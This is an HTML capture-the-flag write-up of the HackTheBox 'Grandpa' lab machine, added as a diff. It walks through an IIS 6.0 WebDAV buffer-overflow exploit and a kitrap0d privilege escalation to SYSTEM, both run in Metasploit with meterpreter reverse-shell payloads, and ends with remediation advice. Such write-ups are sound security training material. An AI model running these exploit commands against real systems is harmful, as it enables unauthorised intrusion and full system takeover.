@@ -1,0 +1,661 @@
+
+  
+    
+    <title>
+      HackTheBox - Grandpa (Easy)
+    </title>
+    
+  
+  
+    
+      <header>
+<div class="header"><img src="https://www.notion.so/images/page-cover/gradients_3.png" class="headerImage"/>
+<img class="headerIcon" src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Grandpa/icon.png"/>
+<h1 class="mainTitle">
+          HackTheBox - Grandpa (Easy)
+        </h1 class="mainTitle">
+</div></header>
+      <div class="writeUp">
+        <h1 id="c42be2c8-9bed-441d-8a24-ef8894e88b6f">
+          Table of contents
+        </h1>
+        <nav id="4eced535-cc64-4ff9-8de8-055f13a85555">
+          <div>
+            <a href="#c42be2c8-9bed-441d-8a24-ef8894e88b6f">
+              Table of contents
+            </a>
+          </div>
+          <div>
+            <a href="#ea92c291-fc63-4d5b-a4a6-2b490e6c54ab">
+              Enumeration
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#7c25c4b8-0026-4e12-b3ad-ba98e975a7b8">
+              
+                Nmap scan
+              
+            </a>
+          </div>
+          <div>
+            <a href="#94fe27fd-a691-409b-96e6-52873b74352d">
+              Initial access
+            </a>
+          </div>
+          <div>
+            <a href="#da355b4e-cbd4-400a-92bd-b128cafbe463">
+              Post-exploitation
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#2376d10f-3fdf-4c91-942a-4d2857ebc713">
+              
+                Local enumeration
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#28759567-2141-40c4-9f44-d921fc63d9b2">
+              
+                Privilege escalation
+              
+            </a>
+          </div>
+          <div>
+            <a href="#0c9f5078-d510-463c-99e4-7edd078ccde4">
+              Vulnerabilities summary
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#95515b75-4639-4e7b-9e3e-84fd41ba1758">
+              
+                Buffer Overflow
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#df0c0499-03cc-4b3f-ad6d-1900fc7312c6">
+              
+                MS10-015
+              
+            </a>
+          </div>
+          <div>
+            <a href="#a3fd53da-2f83-45c1-b531-a2f8458afe21">
+              Tools used
+            </a>
+          </div>
+          <div>
+            <a href="#c371bfd5-0473-43ae-a887-d20220bf0993">
+              Sources
+            </a>
+          </div>
+        </nav>
+        <h1 id="ea92c291-fc63-4d5b-a4a6-2b490e6c54ab">
+          Enumeration
+        </h1>
+        <h2 id="7c25c4b8-0026-4e12-b3ad-ba98e975a7b8">
+          
+            Nmap scan
+          
+        </h2>
+        
+        
+        
+<pre id="3a45f9b2-e8cc-4bb1-8889-4e385c10c92f" class="code"><code># Nmap 7.94 scan initiated Tue Jul 18 18:06:27 2023 as: nmap -A -p- -T5 -oN nmapResults.txt 10.129.140.154
+Nmap scan report for 10.129.140.154
+Host is up (0.027s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+|_http-title: Under Construction
+|_http-server-header: Microsoft-IIS/6.0
+| http-methods: 
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+| http-webdav-scan: 
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+|   WebDAV type: Unknown
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   Server Date: Tue, 18 Jul 2023 22:07:26 GMT
+|_  Server Type: Microsoft-IIS/6.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Jul 18 18:07:32 2023 -- 1 IP address (1 host up) scanned in 64.45 seconds</code></pre>
+        <h1 id="94fe27fd-a691-409b-96e6-52873b74352d">
+          Initial access
+        </h1>
+        <p id="b67e81e3-38bc-4dcb-93e0-0c37eaad0c1d">
+          According to Nmap, the web server accepts the PUT method, which allows us to upload files to the web server. Before trying to exploit this, let’s just make a simple test : 
+        </p>
+        
+        
+        
+<pre id="11f9600b-8075-4747-aa11-67b7a30ee2cd" class="code"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Grandpa]
+└─$ echo &#x27;File upload works !&#x27; &gt; file.txt
+                                                                                                                              
+┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Grandpa]
+└─$ curl -X PUT http://10.129.140.154/file.txt --upload-file file.txt
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;
+&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;The page cannot be saved&lt;/TITLE&gt;
+&lt;META HTTP-EQUIV=&quot;Content-Type&quot; Content=&quot;text/html; charset=Windows-1252&quot;&gt;
+&lt;STYLE type=&quot;text/css&quot;&gt;
+  BODY { font: 8pt/12pt verdana }
+  H1 { font: 13pt/15pt verdana }
+  H2 { font: 8pt/12pt verdana }
+  A:link { color: red }
+  A:visited { color: maroon }
+&lt;/STYLE&gt;
+&lt;/HEAD&gt;&lt;BODY&gt;&lt;TABLE width=500 border=0 cellspacing=10&gt;&lt;TR&gt;&lt;TD&gt;
+
+&lt;h1&gt;The page cannot be saved&lt;/h1&gt;
+There is a problem saving the page to the Web site. This error can occur if you attempt to upload a file or modify a file in a directory that does not allow Write access.
+&lt;hr&gt;
+&lt;p&gt;Please try the following:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Contact the Web site administrator if you believe this directory should allow write access.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;HTTP Error 403.3 - Forbidden: Write access is denied.&lt;br&gt;Internet Information Services (IIS)&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;Technical Information (for support personnel)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Go to &lt;a href=&quot;http://go.microsoft.com/fwlink/?linkid=8180&quot;&gt;Microsoft Product Support Services&lt;/a&gt; and perform a title search for the words &lt;b&gt;HTTP&lt;/b&gt; and &lt;b&gt;403&lt;/b&gt;.&lt;/li&gt;
+&lt;li&gt;Open &lt;b&gt;IIS Help&lt;/b&gt;, which is accessible in IIS Manager (inetmgr),
+ and search for topics titled &lt;b&gt;Using Virtual Directories&lt;/b&gt;, &lt;b&gt;Changing Default Web Site Settings&lt;/b&gt;, and &lt;b&gt;About Custom Error Messages&lt;/b&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;/TD&gt;&lt;/TR&gt;&lt;/TABLE&gt;&lt;/BODY&gt;&lt;/HTML&gt;</code></pre>
+        <p id="92848f05-de7b-4746-b8ee-ef0fb556e2b7">
+          It seems that the root of the web server is not writable. Let’s use the 
+          <a href="https://www.metasploit.com/">
+            Metasploit Framework
+          </a>
+           to search for exploit for Webdav on Microsoft IIS 6.0 : 
+        </p>
+        
+        
+        
+<pre id="6ad3bd93-b69e-4379-b594-e1f28cecf49d" class="code"><code>msf6 &gt; search webdav iis 6.0
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank    Check  Description
+   -  ----                                                 ---------------  ----    -----  -----------
+   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl</code></pre>
+        <p id="9d05b593-2dcf-47c5-886f-7e69f34052ba">
+          There is one exploit that seems to be available for the current target. Let’s try to use this exploit : 
+        </p>
+        
+        
+        
+<pre id="dd26fae0-3b55-4e8b-a6d9-f56fa44eb6c9" class="code"><code>msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; set LHOST tun0
+LHOST =&gt; 10.10.14.93
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; set RHOSTS 10.129.140.154
+RHOSTS =&gt; 10.129.140.154
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.93:4444 
+[*] Trying path length 3 to 60 ...
+[*] Sending stage (175686 bytes) to 10.129.140.154
+[*] Meterpreter session 1 opened (10.10.14.93:4444 -&gt; 10.129.140.154:1030) at 2023-07-18 18:57:18 -0400
+
+meterpreter &gt; getuid
+[-] stdapi_sys_config_getuid: Operation failed: Access is denied.</code></pre>
+        <p id="b8b257ca-82f9-4fc6-857a-38f9bfa11e12">
+          We have a meterpreter reverse shell now. But it seems to have very low privileges. Let’s migrate to another process : 
+        </p>
+        
+        
+        
+<pre id="bf7f94ed-11ee-41c0-a000-77404009cb1e" class="code"><code>meterpreter &gt; ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System
+ [CROPPED]
+ 668   392   svchost.exe
+ 732   580   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+ 736   392   svchost.exe
+ [CROPPED]
+
+meterpreter &gt; migrate 732
+[*] Migrating from 1648 to 732...
+[*] Migration completed successfully.
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\NETWORK SERVICE</code></pre>
+        <p id="ac92a679-631a-4399-a392-5124a5e94b97">
+          Now, we have a stable meterpreter reverse shell as 
+          <code>
+            NT AUTHORITY\NETWORK SERVICE
+          </code>
+          . 
+        </p>
+        <h1 id="da355b4e-cbd4-400a-92bd-b128cafbe463">
+          Post-exploitation
+        </h1>
+        <h2 id="2376d10f-3fdf-4c91-942a-4d2857ebc713">
+          
+            Local enumeration
+          
+        </h2>
+        <p id="00a73587-050b-4f2c-8231-8b48ae2727a8">
+          Let’s use the 
+          <code>
+            post/multi/recon/local_exploit_suggester
+          </code>
+           module to enumerate potential local exploits for privilege escalation : 
+        </p>
+        
+        
+        
+<pre id="b88b075c-e779-47b5-afc3-f56b2f8effa4" class="code"><code>meterpreter &gt; background 
+[*] Backgrounding session 1...
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; use post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) &gt; set session 1 
+session =&gt; 1
+msf6 post(multi/recon/local_exploit_suggester) &gt; run
+
+[*] 10.129.140.154 - Collecting local exploits for x86/windows...
+[*] 10.129.140.154 - 186 exploit checks are being tried...
+[+] 10.129.140.154 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.129.140.154 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.129.140.154 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.129.140.154 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.129.140.154 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.129.140.154 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.129.140.154 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Running check method for exploit 41 / 41
+[*] 10.129.140.154 - Valid modules for session 1:
+============================
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.                                                                                                            
+ 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.                                                                                                                           
+ 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.                                                                                                                           
+ 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.                                                                                                                           
+ 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.                                                                                                            
+ 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.                                                                                                                           
+ 7   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.                                                                                                                           
+ 8   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
+[CROPPED]</code></pre>
+        <h2 id="28759567-2141-40c4-9f44-d921fc63d9b2">
+          
+            Privilege escalation
+          
+        </h2>
+        <p id="666bb257-58c0-4483-b91c-5232df3e1a02">
+          Let’s try to use the 
+          <code>
+            exploit/windows/local/ms10_015_kitrap0d
+          </code>
+           module to exploit 
+          
+            
+              MS10-015
+            
+          
+           in order to gain a shell as 
+          <code>
+            NT AUTHORITY\SYSTEM
+          </code>
+           : 
+        </p>
+        
+        
+        
+<pre id="24cd0c77-9937-4d4e-96d1-63e3a1ec6a1a" class="code"><code>msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/ms10_015_kitrap0d
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; set session 1 
+session =&gt; 1
+msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; set LHOST tun0
+LHOST =&gt; tun0
+msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.93:4444 
+[*] Reflectively injecting payload and triggering the bug...
+[*] Launching msiexec to host the DLL...
+[+] Process 3512 launched.
+[*] Reflectively injecting the DLL into 3512...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (175686 bytes) to 10.129.140.154
+[*] Meterpreter session 2 opened (10.10.14.93:4444 -&gt; 10.129.140.154:1032) at 2023-07-18 19:02:59 -0400
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM</code></pre>
+        <p id="c7c5b948-259f-48a5-ab4d-831e8a2c583e">
+          We have now a reverse meterpreter shell as 
+          <code>
+            NT AUTHORITY\SYSTEM
+          </code>
+          .
+        </p>
+        <h1 id="0c9f5078-d510-463c-99e4-7edd078ccde4">
+          Vulnerabilities summary
+        </h1>
+        <h2 id="95515b75-4639-4e7b-9e3e-84fd41ba1758">
+          
+            Buffer Overflow
+          
+        </h2>
+        <table id="398f6600-934c-4b98-a30b-cd75ae56e8c9">
+          <thead>
+            <tr id="c21081d6-5513-4e84-ad55-00b5ab2b2871">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="b8a06108-df99-4171-a84c-de4a5022453d">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                Web server
+              </td>
+            </tr>
+            <tr id="0939a806-93d7-407c-a1dc-f9460f19d849">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  9.8
+                
+              </td>
+            </tr>
+            <tr id="bdecbd50-836b-4741-8838-a82ef2709595">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    CRITICAL
+                  
+                
+              </td>
+            </tr>
+            <tr id="f0fdeeb2-0968-424d-a409-2ebeae08d274">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Local
+                
+              </td>
+            </tr>
+            <tr id="02ecf466-64b7-426b-833d-b5fe98e5e1ca">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to inject malicious code in memory to execute a reverse shell and gain a foothold on the system as 
+                <code>
+                  NT AUTHORITY\NETWORK SERVICE
+                </code>
+                .
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    integrity
+                  
+                
+                
+                   and 
+                
+                
+                  
+                    availability 
+                  
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="9d00bba8-87de-4dce-b452-8dd0f68755ef">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                - Disable PROPFIND requests
+                
+                - Upgrade the operating system and install the latest version of Microsoft IIS.
+                
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="df0c0499-03cc-4b3f-ad6d-1900fc7312c6">
+          
+            MS10-015
+          
+        </h2>
+        <table id="18f2f45f-c4e6-4da6-b5e4-49f6fbc12125">
+          <thead>
+            <tr id="c8518c22-1134-4d1b-8a3e-b92832bac508">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="13ad5169-522b-49f7-b518-60081bf7d7e3">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                Local system
+              </td>
+            </tr>
+            <tr id="838ddd48-ef2e-4fb0-a537-9f9ebfee4778">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  8.4
+                
+              </td>
+            </tr>
+            <tr id="e9d7d923-6357-4d74-a32f-a06ee04c41d2">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    HIGH
+                  
+                
+              </td>
+            </tr>
+            <tr id="e2eba22f-07b8-4af4-b9c3-d75505ddda51">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Local
+                
+              </td>
+            </tr>
+            <tr id="6cb1cd61-19b3-48f2-97c1-7dbfabd56c14">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to elevate his privileges in order to gain access to the system as 
+                <code>
+                  NT AUTHORITY\SYSTEM
+                </code>
+                .
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    integrity
+                  
+                
+                
+                   and 
+                
+                
+                  
+                    availability 
+                  
+                
+                of the entire system.
+              </td>
+            </tr>
+            <tr id="87faa582-b4c6-4f51-b679-a7554c880afa">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Update the system through Windows Update.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="a3fd53da-2f83-45c1-b531-a2f8458afe21">
+          Tools used
+        </h1>
+        <table id="e5bc7cd4-2bac-4cec-94ef-1a7cce07a829">
+          <thead>
+            <tr id="8f70d452-b998-4207-8870-f3f3cf1f8a52">
+              <th id="`&gt;MF">
+                Tool
+              </th>
+              <th id="A|qY">
+                Purpose
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="a6db9615-4b3b-4f21-b92b-7cde49267994">
+              <td id="`&gt;MF">
+                <a href="https://nmap.org/book/man.html">
+                  Nmap
+                </a>
+              </td>
+              <td id="A|qY">
+                - Scan for open ports
+                
+                - Scan services versions
+                
+              </td>
+            </tr>
+            <tr id="712630d4-eb2b-474c-84a2-dfa9ead090ee">
+              <td id="`&gt;MF">
+                <a href="https://curl.se/">
+                  curl
+                </a>
+              </td>
+              <td id="A|qY">
+                - Send HTTP requests to the web server
+              </td>
+            </tr>
+            <tr id="5a9cf691-5c81-45f8-961e-a16fc6d961a7">
+              <td id="`&gt;MF">
+                <a href="https://www.metasploit.com/">
+                  Metasploit Framework
+                </a>
+              </td>
+              <td id="A|qY">
+                - Run exploits against the target system
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="c371bfd5-0473-43ae-a887-d20220bf0993">
+          Sources
+        </h1>
+        <ul id="0e165f96-3bd1-41ce-afdb-33639379e0d6">
+          <li>
+            HTTP PUT method : 
+            <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT">
+              https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT
+            </a>
+          </li>
+        </ul>
+        <ul id="9d5b77ac-3370-44c5-acaa-ed12cd424dd1">
+          <li>
+            MS10-015 (kitrap0d) : 
+            <a href="https://vk9-sec.com/kitrap0d-windows-kernel-could-allow-elevation-of-privilege-ms10-015-cve-2010-0232/">
+              https://vk9-sec.com/kitrap0d-windows-kernel-could-allow-elevation-of-privilege-ms10-015-cve-2010-0232/
+            </a>
+          </li>
+        </ul>
+        <ul id="d95f3e7f-7365-41ab-9f29-40302bc567bb">
+          <li>
+            NIST NVD CVE-2010-0232 (kitrap0d) : 
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2010-0232">
+              https://nvd.nist.gov/vuln/detail/CVE-2010-0232
+            </a>
+          </li>
+        </ul>
+        <ul id="9866bb32-ad43-4a0c-b8ca-f91c326d9aec">
+          <li>
+            Microsoft IIS 6.0 BOF (Buffer Overflow) : 
+            <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7269">
+              https://nvd.nist.gov/vuln/detail/CVE-2017-7269
+            </a>
+          </li>
+        </ul>
+      </div>
+    
+    <span>
+    </span>
+  
+
